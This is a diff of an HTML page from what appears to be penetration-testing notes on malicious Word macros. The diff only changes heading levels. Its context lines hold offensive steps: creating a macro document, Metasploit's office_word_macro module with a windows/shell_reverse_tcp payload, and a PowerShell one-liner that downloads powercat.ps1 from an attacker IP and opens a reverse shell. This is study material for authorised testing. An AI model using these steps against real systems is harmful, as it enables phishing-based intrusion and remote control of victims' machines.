@@ -173,7 +173,8 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h2 id="manual-method"><a class="header" href="#manual-method">Manual Method</a></h2>
+                        <h2 id="macros"><a class="header" href="#macros">Macros</a></h2>
+<h3 id="manual-method"><a class="header" href="#manual-method">Manual Method</a></h3>
 <pre><code>Open Word Document → View → Macros → Macro Name: MyMacro → Macros in: Document(1) → Create
 Save it in only .docm or .doc format .docx is not supported.
 
@@ -207,7 +208,7 @@ for i in range(0, len(str), n):
 
 3) Copy the split and paste it in Macro (below Dim str and above CreateObject)
 </code></pre>
-<h2 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h2>
+<h3 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h3>
 <ol>
 <li>
 <p>Follow the First 4 Steps with the below's reference: <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/office_word_macro.md</a></p>
@@ -225,7 +226,7 @@ set payload windows/shell_reverse_tcp
 set lhost and lport
 Open a listener and pop up a reverse shell.
 </code></pre>
-<h2 id="macro-example"><a class="header" href="#macro-example">Macro Example</a></h2>
+<h3 id="macro-example"><a class="header" href="#macro-example">Macro Example</a></h3>
 <pre><code>If possible do a powershell reverse shell base 64 encoded:
 
 IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
